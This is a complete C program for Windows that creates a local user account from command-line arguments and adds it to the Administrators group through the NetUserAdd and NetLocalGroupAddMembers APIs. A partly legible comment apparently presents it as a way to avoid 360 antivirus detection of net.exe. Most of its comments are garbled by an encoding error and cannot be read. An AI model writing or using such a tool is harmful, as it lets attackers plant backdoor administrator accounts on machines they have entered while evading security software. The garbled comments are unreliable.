#ifdef UNICODE
#define UNICODE
#endif
#include<windows.h>
#include<Shlobj.h>
#include<stdio.h>
#include<stdlib.h>
#include<lm.h>
#include<lmaccess.h> 

#pragma comment(lib,"netapi32.lib")


int wmain(int argc, wchar_t* argv[])
{

	/// <summary>
	/// windows ����api ����û������뵽����Ա���ƹ�360��net.exe�ļ��
	/// https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netuseradd
	/// The NetUserAdd �������һ���û���ָ�������Ȩ�޼���
	/// https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/ns-lmaccess-user_info_1        USER_INFO_1 structure
	/// USER_INFO_1 �ṹ������û��˻�����Ϣ���� �˻��������룬Ȩ�޼����û���Ŀ¼·��
	/// </summary>

	/*
		NET_API_STATUS NET_API_FUNCTION NetUserAdd(
			LPCWSTR servername,					�����ַ��� ָ��DNS����NetBIOSԶ�̷����������ƣ�NULL��ʾ���ػ���							
			DWORD   level,						ָ�����ݵ���Ϣ���� ��Ӧ�ṹ��  USER_INFO_1��2��3��4
			LPBYTE  buf,						ָ��ָ�����ݵ�ָ��  ���ݵĸ�ʽ������ level parameter
			LPDWORD parm_err					���մ���ERROR_INVALID_PARAMETER������Ϣ��NULL��ʾû�з��ش���
			);	

		Return Value:  �����ɹ�����  NERR_Success 


		typedef struct _USER_INFO_1 {
			LPWSTR usri1_name;                  ָ��ָ���û��˻�Unicode�ַ�����һ��ָ��
			LPWSTR usri1_password;			    ��ָ��ָ����usri1_name��Աָʾ���û�������
			DWORD  usri1_password_age;		    ���ϴθ�������������ʱ��(s)     NetUserAdd/NetUseSetInfo�������������Ա
			DWORD  usri1_priv;				    ָ��usri1_name��Ա��Ȩ�޼��� NetUserAdd��Ӧ USER_PRIV_USERȨ��
			LPWSTR usri1_home_dir;				����ΪNULL
			LPWSTR usri1_comment;				������˻���ע��˵��������ΪNULL
			DWORD  usri1_flags;					
			LPWSTR usri1_script_path;
			USER_INFO_1, *PUSER_INFO_1, *LPUSER_INFO_1;
			};
	*/


	
	/// <summary>
	/// windows api ���� NetLocalGroupAddMembers ���û���ӵ�����Ա��
	/// https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers
	///
	/// </summary>


	/*
	    NET_API_STATUS NET_API_FUNCTION NetLocalGroupAddMembers(
			LPCWSTR servername,                 �����ַ��� ָ��DNS����NetBIOSԶ�̷����������ƣ�NULL��ʾ���ػ���    
			LPCWSTR groupname,					ָ��ָ���û�Ҫ����ı��������ȫ�������Ƶ�һ�������ַ���
			DWORD   level,						LOCALGROUP_MEMBERS_INFO_0 ָ���±������Ա��SID   3 ��ʾ����
			LPBYTE  buf,						ָ��ָ�����ݵ�ָ��  ���ݵĸ�ʽ������ level parameter
			DWORD   totalentries				ָ��buf����ָ��Ļ������е���Ŀ����
			);

		Return value: �ɹ����� NERR_Success


		typedef struct _LOCALGROUP_MEMBERS_INFO_0 {
			PSID lgrmi0_sid;
			} LOCALGROUP_MEMBERS_INFO_0, *PLOCALGROUP_MEMBERS_INFO_0, *LPLOCALGROUP_MEMBERS_INFO_0;

		
	*/

	// �ж��Ƿ��Թ���ԱȨ�����У������޷�����û�
	BOOL IsAdmin = IsUserAnAdmin();				// https://docs.microsoft.com/en-us/windows/win32/api/shlobj_core/nf-shlobj_core-isuseranadmin
	if (!IsAdmin)
	{
		fwprintf(stderr, L"[-] Run as administrator level!");
		exit(EXIT_FAILURE);
	}

	// ʹ��USER_INFO_1 �ṹ��
	USER_INFO_1 ui;
	DWORD dwLevel = 1;
	DWORD dwError = 0;
	NET_API_STATUS nStatus;

	if (argc != 3)
	{
		fwprintf(stderr, L"[-] Usage: %s UserName PassWord\n", argv[0]);
		exit(EXIT_FAILURE);
	}
	else
	{
		ui.usri1_name = argv[1];
		ui.usri1_password = argv[2];
		ui.usri1_priv = USER_PRIV_USER;
		ui.usri1_home_dir = NULL;
		ui.usri1_comment = NULL;
		ui.usri1_flags = UF_SCRIPT;
		ui.usri1_script_path = NULL;


		// use NetUserAdd  specifying level 1
		nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&ui, NULL);
		if (nStatus == NERR_Success)
		{
			fwprintf(stderr, L"[+] User %s has been successgully added on localhost\n", argv[1]);
		}
		else
		{
			fwprintf(stderr,L"[-] A system error has occurred: %d\n", nStatus);
		}
	}


	// ��ӵ�����Ա��
	NET_API_STATUS gStatus;
	LOCALGROUP_MEMBERS_INFO_3 gi;
	gi.lgrmi3_domainandname = ui.usri1_name;
	DWORD level = 3;
	DWORD totalentries = 1;

	gStatus = NetLocalGroupAddMembers(NULL, L"Administrators", level,(LPBYTE)&gi, totalentries);
	if (gStatus == NERR_Success)
	{
		fwprintf(stderr, L"[+] User %s has been added into administrators\n", argv[1]);
	}
	else
	{
		fwprintf(stderr, L"[-] A system error has occurred: %d\n", gStatus);
	}		

	return 0;
}